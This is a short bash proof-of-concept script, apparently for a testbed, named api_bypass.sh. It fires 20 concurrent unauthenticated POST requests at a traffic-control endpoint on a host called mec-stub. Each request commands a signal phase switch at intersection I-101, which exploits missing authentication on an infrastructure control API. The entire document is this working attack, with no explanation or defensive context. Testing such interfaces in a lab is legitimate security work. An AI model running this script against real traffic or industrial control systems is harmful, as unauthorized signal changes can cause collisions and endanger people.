#!/bin/bash
# usage: ./api_bypass.sh http://mec-stub:8080/control

URL=${1:-http://mec-stub:8080/control}

echo "[*] Sending 20 unauthenticated POST requests to $URL"

for i in $(seq 1 20); do
  curl -s -X POST "$URL" \
    -H "Content-Type: application/json" \
    -d "{\"cmd\":\"switch_phase\",\"intersection_id\":\"I-101\",\"seq\":$i}" &
done

wait
echo "[*] Done."
